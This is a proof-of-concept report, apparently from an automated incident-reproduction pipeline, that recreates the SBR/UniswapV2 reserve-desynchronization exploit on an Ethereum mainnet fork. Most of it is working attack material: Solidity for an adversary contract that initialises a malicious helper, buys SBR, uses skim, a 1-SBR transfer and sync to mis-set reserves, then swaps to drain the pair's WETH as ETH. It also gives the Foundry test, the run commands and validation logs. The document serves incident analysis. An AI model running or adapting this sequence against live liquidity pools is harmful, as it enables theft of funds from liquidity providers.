## Overview & Context

This proof-of-concept (PoC) reproduces the SBR/UniswapV2 WETH reserve desynchronization exploit on Ethereum mainnet, where a malicious SBR token and helper contract enable an attacker to drain nearly all WETH backing from the SBR/WETH UniswapV2 pair.  
The PoC operates against a mainnet fork at block 21,991,721 (the pre-state immediately before the real exploit block 21,991,722) and demonstrates the same skim/sync/mispriced-swap pattern identified in the root-cause analysis.

- **Incident type:** Monetary profit exploit (protocol bug in SBR/helper design)
- **Reference asset:** ETH (via WETH → ETH withdrawal)
- **Victim protocol:** UniswapV2Pair(SBR-WETH) and associated liquidity
- **Goal of PoC:** Show that an unprivileged attacker can, from public mainnet state, desynchronize SBR/WETH reserves and drain WETH as ETH profit using only public contracts.

**Command to run the PoC (from session root):**

```bash
cd forge_poc
RPC_URL="<your Ethereum mainnet RPC URL>" forge test --via-ir -vvvvv
```

This executes `ExploitTest::testExploit`, which runs on a forked mainnet state and logs a full call trace (including the critical reserve transitions and WETH withdrawal) to `artifacts/poc/poc_validator/forge-test.log`.

## PoC Architecture & Key Contracts

### Main Contracts and Roles

- `SBRExploitPoC` (in `forge_poc/test/Exploit.sol`): adversary contract that orchestrates the exploit sequence.
- `ExploitTest` (in `forge_poc/test/Exploit.sol`): Foundry test that sets up the fork, deploys `SBRExploitPoC`, and asserts oracles.
- External mainnet contracts (victim & infrastructure):
  - `WETH9` at `0xC02a…6Cc2` (canonical WETH).
  - `SBR` token at `0x460B…206D` (malicious token).
  - `SBR/WETH UniswapV2Pair` at `0x3431…4FF2`.
  - `UniswapV2Router02` at `0x7a25…488D`.
  - `SBRHelper` at `0xaCa4…3cB1` (stateful helper using `msgSend`/`msgReceive`).
- `attacker`: a fresh EOA generated via `makeAddr("attacker")`, not the real incident EOA.

### Adversary Contract Logic

The adversary contract mirrors the real-world exploit path with a compact `attack` function.  
Below is the core sequence (from `forge_poc/test/Exploit.sol`, contract `SBRExploitPoC`):

```solidity
function attack(uint256 ethAmountIn) external payable {
    require(msg.sender == attackerEOA, "only attacker");
    require(msg.value == ethAmountIn, "incorrect msg.value");

    // 1) Helper precondition (matches on-chain setup call).
    (bool ok, ) = helper.call(abi.encodeWithSelector(bytes4(0x4f49cd31)));
    require(ok, "helper init failed");

    // 2) Buy SBR via router, triggering SBR/helper accounting.
    address[] memory path = new address[](2);
    path[0] = address(weth);
    path[1] = address(sbr);
    uint256 deadline = block.timestamp + 1 hours;
    uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: ethAmountIn}(
        0, path, address(this), deadline
    );

    uint256 sbrBalance = sbr.balanceOf(address(this));
    require(sbrBalance > 1, "insufficient SBR after buy");

    // 3) Skim + 1 SBR transfer + sync → reserves (1 SBR, large WETH).
    sbrWethPair.skim(address(sbrWethPair));
    require(sbr.transfer(address(sbrWethPair), 1), "SBR transfer to pair failed");
    sbrWethPair.sync();

    // 4) Mispriced swap: drain WETH to attackerEOA as ETH.
    uint256 amountIn = sbrBalance - 1;
    require(sbr.approve(address(uniswapV2Router), amountIn), "approve failed");
    address[] memory path2 = new address[](2);
    path2[0] = address(sbr);
    path2[1] = address(weth);
    uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
        amountIn, 0, path2, attackerEOA, deadline
    );
}
```

**Caption:** Core adversary sequence in `SBRExploitPoC.attack`, showing helper setup, initial SBR buy, reserve desync via `skim`/`sync`, and final mispriced swap to ETH.

This logic precisely exercises the SBR/helper reserve-manipulation behavior: the helper’s `msgSend`/`msgReceive`-gated callback is triggered during transfers, enabling the 1-SBR/large-WETH reserve state that underpins the exploit.

## Adversary Execution Flow

### Environment Setup and Funding

`ExploitTest.setUp` prepares a mainnet fork and attacker:

```solidity
string memory rpcUrl = vm.envString("RPC_URL");
uint256 forkId = vm.createSelectFork(rpcUrl, 21_991_721);
vm.selectFork(forkId);

attacker = makeAddr("attacker");
deal(attacker, 1 ether);
```

**Caption:** Mainnet fork at block 21,991,721 and attacker funding in `ExploitTest.setUp`.

Key points:

- The fork block `21_991_721` is `exploit_block - 1`, matching the ACT pre-state definition.
- `attacker` is a synthetic EOA funded with a bounded `1 ether` to cover gas and the small initial swap.
- No real attacker EOA or attacker-deployed contract addresses are used.

### Deployment and Configuration

Within `setUp`, the test:

- Labels key contracts (`attacker`, `WETH9`, `SBR`, `SBR/WETH UniswapV2Pair`, `UniswapV2Router02`, `SBRHelper`) for readable traces.
- Verifies oracle preconditions:
  - Pair has non-zero WETH and SBR balance.
  - Attacker has non-zero ETH.
- Deploys `SBRExploitPoC` under `attacker` via `vm.startPrank(attacker)` / `vm.stopPrank`.

### Exploit Execution and Profit Realization

The main test `testExploit` implements the end-to-end ACT sequence:

```solidity
function testExploit() public {
    uint256 attackerEthBefore = attacker.balance;
    (uint112 reserveSbrBefore, uint112 reserveWethBefore, ) = sbrWethPair.getReserves();

    vm.expectEmit(true, true, false, false, WETH_ADDRESS);
    emit IWETH.Withdrawal(ROUTER_ADDRESS, 0);

    vm.prank(attacker);
    exploit.attack{value: 4000}(4000);

    uint256 attackerEthAfter = attacker.balance;
    (uint112 reserveSbrAfter, uint112 reserveWethAfter, ) = sbrWethPair.getReserves();
    uint256 wethPairAfter = weth.balanceOf(PAIR_ADDRESS);

    assertGt(attackerEthAfter, attackerEthBefore, "attacker profit must be denominated in ETH");
    assertGt(reserveWethBefore, reserveWethAfter, "WETH reserves in the pair must strictly decrease after exploit");
    assertGt(attackerEthAfter, attackerEthBefore, "attacker must end with strictly more ETH");
    assertLt(wethPairAfter, wethPairBefore, "pair must lose WETH reserves");
    assertLt(uint256(reserveSbrAfter), uint256(reserveSbrBefore), "SBR reserve should shrink after exploit");
}
```

**Caption:** `ExploitTest::testExploit` driving the exploit and asserting attacker profit and reserve changes.

Execution steps:

1. **Record pre-state:** attacker ETH balance and pair reserves via `getReserves()`.
2. **Set expectation:** `vm.expectEmit` for a `WETH9::Withdrawal` event from the router, ensuring the WETH→ETH path completes without revert.
3. **Execute attack:** `exploit.attack{value: 4000}(4000)` from the attacker:
   - `4000` wei is the same ETH value used in the real exploit transaction.
   - The call triggers helper setup, initial SBR buy, skim/1-SBR/sync reserve desync, and final mispriced swap.
4. **Post-checks:** Attacker ETH increases; WETH reserves in the pair strictly decrease; pair’s WETH balance drops; SBR reserve shrinks, confirming desynchronization.

The detailed call trace in `forge-test.log` shows the same sequence seen on mainnet: helper callbacks, `SBR::msgSend`/`msgReceive`, `skim`, `sync` setting reserves to `(1, ~8.495e18)`, followed by `swap` and `WETH9::withdraw` leading to an ETH transfer to the attacker.

## Oracle Definitions and Checks

The oracle specification in `artifacts/poc/oracle_generator/oracle_definition.json` defines variables, pre-checks, hard constraints, and soft constraints. The PoC implements all of them as follows.

### Variables

- `attacker` (role: Attacker): synthetic EOA created in the test; target of profit checks.
- `weth` (role: Token): WETH9 at `0xC02a…6Cc2`.
- `sbr` (role: Token): malicious SBR at `0x460B…206D`.
- `sbrWethPair` (role: Protocol): UniswapV2Pair(SBR-WETH) at `0x3431…4FF2`.
- `uniswapV2Router` (role: Protocol): UniswapV2Router02 at `0x7a25…488D`.

### Pre-checks

1. **Pair has meaningful liquidity**
   - Oracle intent: non-zero WETH and non-trivial SBR reserves before exploit.
   - Implementation: in `setUp`, `wethPairBefore` and `sbrPairBefore` are read via `balanceOf`, and `assertGt` ensures both are > 0.
2. **Attacker has bounded ETH**
   - Oracle intent: attacker starts with some ETH but not the final profit.
   - Implementation: `deal(attacker, 1 ether)` followed by `attackerEthBefore = attacker.balance; assertGt(attackerEthBefore, 0);`.

### Hard Constraints

1. **`hard-asset-type-profit-eth` (profit in ETH)**
   - Oracle: attacker’s net profit must be realized in native ETH.
   - Implementation: in `testExploit`, `attackerEthBefore` and `attackerEthAfter` are compared with `assertGt(attackerEthAfter, attackerEthBefore, ...)`.
   - Evidence: call trace shows `WETH9::withdraw` and a final ETH transfer into the attacker address.

2. **`hard-pair-reserve-desync-sequence` (reserve desynchronization)**
   - Oracle: reserves must move from a high-WETH state to dramatically reduced WETH, reflecting a mispriced swap after a `sync` against 1 SBR.
   - Implementation:
     - Reserve shaping is done inside `SBRExploitPoC.attack` via `skim`, `transfer(..., 1)`, and `sync`.
     - `testExploit` checks `reserveWethBefore > reserveWethAfter` and additionally `reserveSbrAfter < reserveSbrBefore`.
   - Evidence: `forge-test.log` shows `sync()` setting reserves to `(1, 8.495e18)` and a subsequent `swap` that drains WETH to the router, then to the attacker.

3. **`hard-behavior-swap-weth-to-attacker` (successful swap path)**
   - Oracle: the core path must complete a UniswapV2 swap that sends WETH (withdrawn to ETH) to the attacker without revert.
   - Implementation:
     - `vm.expectEmit` on `WETH9::Withdrawal(ROUTER_ADDRESS, ...)` before calling `attack`.
     - The test only passes if the withdrawal event occurs and the call does not revert.
   - Evidence: trace shows `swapExactTokensForETHSupportingFeeOnTransferTokens`, `UniswapV2Pair::swap`, `WETH9::withdraw`, and final ETH transfer to the attacker.

### Soft Constraints

1. **`soft-attacker-profit-eth` (positive ETH profit)**
   - Oracle: attacker ends with strictly more ETH than before (no exact amount required).
   - Implementation: the same `assertGt(attackerEthAfter, attackerEthBefore, ...)` double-serves the hard and soft profit constraints.

2. **`soft-victim-weth-depletion` (WETH drained from pair)**
   - Oracle: the SBR/WETH pair loses WETH reserves during the exploit.
   - Implementation: `wethPairBefore` and `wethPairAfter` are compared, with `assertLt(wethPairAfter, wethPairBefore, ...)`.
   - Evidence: trace confirms the pair’s WETH balance falls from ~8.495e18 to a much smaller value, consistent with the root-cause report.

Overall, the PoC faithfully implements all defined pre-checks and oracles, and adds a helpful sanity check on SBR reserve shrinkage to better reflect the documented reserve desynchronization.

## Validation Result and Robustness

The validator executed:

```bash
cd forge_poc
RPC_URL="<your Ethereum mainnet RPC URL>" forge test --via-ir -vvvvv \
  > ../artifacts/poc/poc_validator/forge-test.log 2>&1
```

Key outcomes:

- `ExploitTest::testExploit` passed on an Ethereum mainnet fork at block 21,991,721.
- The detailed trace shows the expected helper callbacks, reserve transitions, and final WETH→ETH withdrawal to the attacker.
- No mocks are used for core protocol components; all interactions are with live mainnet contracts.

The structured validation result is stored at:

```json
{
  "overall_status": "Pass",
  "artifacts": {
    "validator_test_log_path": "/home/ziyue/TxRayExperiment/incident-202512280653/artifacts/poc/poc_validator/forge-test.log"
  }
}
```

**Caption:** Excerpt from `artifacts/poc/poc_validator/poc_validated_result.json` summarizing the validation result and key artifact.

The PoC passes all correctness and quality checks:

- All hard and soft oracles from the definition are implemented and hold on-chain.
- Flow and root cause are clearly explained and labeled in the test and in this report.
- Numeric values are either standard test bounds (`1 ether`) or explicitly derived from incident data (block number, `4000` wei, 1 SBR transfer).
- The test is self-contained from the attacker’s perspective and uses a mainnet fork without introducing local mocks for critical contracts.

## Linking PoC Behavior to Root Cause

The root-cause report attributes the exploit to a malicious SBR token and helper design that:

1. Uses `msgSend`/`msgReceive`-based guards and a helper callback to tag participants.
2. Allows an external contract to pull SBR out of the pair while WETH remains.
3. Forces the pair to `sync` against an extremely small SBR reserve and a large WETH reserve.
4. Immediately swaps SBR back for WETH at this mispriced state, draining WETH to the attacker as ETH.

The PoC ties directly to these steps:

- **Helper precondition:** `helper.call(0x4f49cd31)` replicates the initial helper setup observed in the seed transaction trace, putting the SBR/helper system into the exploitable configuration.
- **Reserve manipulation:** The initial `swapExactETHForTokensSupportingFeeOnTransferTokens` call and subsequent `skim` and 1-SBR transfer exercise the exact `msgSend`/`msgReceive` logic described in the decompiled SBR/helper contracts, leaving the pair with 1 SBR and full WETH.
- **Mispriced sync and swap:** `sync()` records reserves `(1, ~8.495e18)` on the pair; the next `swapExactTokensForETHSupportingFeeOnTransferTokens` mirrors the real exploit’s mispriced swap, converting SBR into WETH that is then withdrawn to ETH.
- **Victim depletion and attacker profit:** Assertions on WETH reserves and attacker ETH balance directly implement the ACT exploit predicate from the root-cause JSON: WETH reserves decrease and attacker ETH increases by a strictly positive amount.

In ACT terms:

- **Adversary-crafted transaction:** In the real incident, a single adversary transaction both deployed the exploit contract and executed the full flow. In the PoC, `ExploitTest::testExploit` plus `SBRExploitPoC.attack` represent the same logical sequence on a forked mainnet state.
- **Exploit predicate:** The PoC’s success criterion—attacker ETH profit with victim WETH reserve depletion—matches the defined ACT opportunity (`≈8.494 ETH` net profit in the original transaction, but only a strictly positive profit is required in the PoC).

Because the PoC reproduces the critical reserve desynchronization and WETH draining behavior on a mainnet fork and satisfies all specified oracles, it constitutes a robust, end-to-end reproduction of the incident’s root cause.

